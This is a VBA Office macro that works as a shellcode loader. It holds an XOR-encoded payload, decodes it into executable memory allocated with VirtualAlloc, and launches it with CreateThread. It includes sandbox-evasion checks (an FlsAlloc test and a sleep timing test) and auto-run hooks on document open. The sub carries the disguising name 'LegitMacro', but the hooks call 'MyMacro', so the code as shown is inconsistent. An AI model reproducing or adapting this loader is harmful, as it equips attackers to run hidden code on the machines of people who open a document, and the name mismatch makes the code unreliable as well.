Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
Sub LegitMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If
    
    ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool)
    buf = Array(6, 178, 121, 30, 10, 18, 54, 250, 250, 250, 187, 171, 187, 170, 168, 178, 203, 40, 159, 178, 113, 168, 154, 171, 178, 113, 168, 226, 178, 113, 168, 218, 172, 178, 245, 77, 176, 176, 178, 113, 136, 170, 183, 203, 51, 178, 203, 58, 86, 198, 155, _
    134, 248, 214, 218, 187, 59, 51, 247, 187, 251, 59, 24, 23, 168, 178, 113, 168, 218, 187, 171, 113, 184, 198, 178, 251, 42, 156, 123, 130, 226, 241, 248, 245, 127, 136, 250, 250, 250, 113, 122, 114, 250, 250, 250, 178, 127, 58, 142, 157, 178, _
    251, 42, 190, 113, 186, 218, 179, 251, 42, 170, 113, 178, 226, 25, 172, 183, 203, 51, 178, 5, 51, 187, 113, 206, 114, 178, 251, 44, 178, 203, 58, 187, 59, 51, 247, 86, 187, 251, 59, 194, 26, 143, 11, 182, 249, 182, 222, 242, 191, 195, _
    43, 143, 34, 162, 190, 113, 186, 222, 179, 251, 42, 156, 187, 113, 246, 178, 190, 113, 186, 230, 179, 251, 42, 187, 113, 254, 114, 178, 251, 42, 187, 162, 187, 162, 164, 163, 160, 187, 162, 187, 163, 187, 160, 178, 121, 22, 218, 187, 168, 5, _
    26, 162, 187, 163, 160, 178, 113, 232, 19, 177, 5, 5, 5, 167, 179, 68, 141, 137, 200, 165, 201, 200, 250, 250, 187, 172, 179, 115, 28, 178, 123, 22, 90, 251, 250, 250, 179, 115, 31, 179, 70, 248, 250, 251, 65, 58, 82, 203, 185, 187, _
    174, 179, 115, 30, 182, 115, 11, 187, 64, 182, 141, 220, 253, 5, 47, 182, 115, 16, 146, 251, 251, 250, 250, 163, 187, 64, 211, 122, 145, 250, 5, 47, 144, 240, 187, 164, 170, 170, 183, 203, 51, 183, 203, 58, 178, 5, 58, 178, 115, 56, _
    178, 5, 58, 178, 115, 59, 187, 64, 16, 245, 37, 26, 5, 47, 178, 115, 61, 144, 234, 187, 162, 182, 115, 24, 178, 115, 3, 187, 64, 99, 95, 142, 155, 5, 47, 127, 58, 142, 240, 179, 5, 52, 143, 31, 18, 105, 250, 250, 250, 178, _
    121, 22, 234, 178, 115, 24, 183, 203, 51, 144, 254, 187, 162, 178, 115, 3, 187, 64, 248, 35, 50, 165, 5, 47, 121, 2, 250, 132, 175, 178, 121, 62, 218, 164, 115, 12, 144, 186, 187, 163, 146, 250, 234, 250, 250, 187, 162, 178, 115, 8, _
    178, 203, 51, 187, 64, 162, 94, 169, 31, 5, 47, 178, 115, 57, 179, 115, 61, 183, 203, 51, 179, 115, 10, 178, 115, 32, 178, 115, 3, 187, 64, 248, 35, 50, 165, 5, 47, 121, 2, 250, 135, 210, 162, 187, 173, 163, 146, 250, 186, 250, _
    250, 187, 162, 144, 250, 160, 187, 64, 241, 213, 245, 202, 5, 47, 173, 163, 187, 64, 143, 148, 183, 155, 5, 47, 179, 5, 52, 19, 198, 5, 5, 5, 178, 251, 57, 178, 211, 60, 178, 127, 12, 143, 78, 187, 5, 29, 162, 144, 250, 163, _
    65, 26, 231, 208, 240, 187, 115, 32, 5, 47)
    
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Decode the shellcode
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
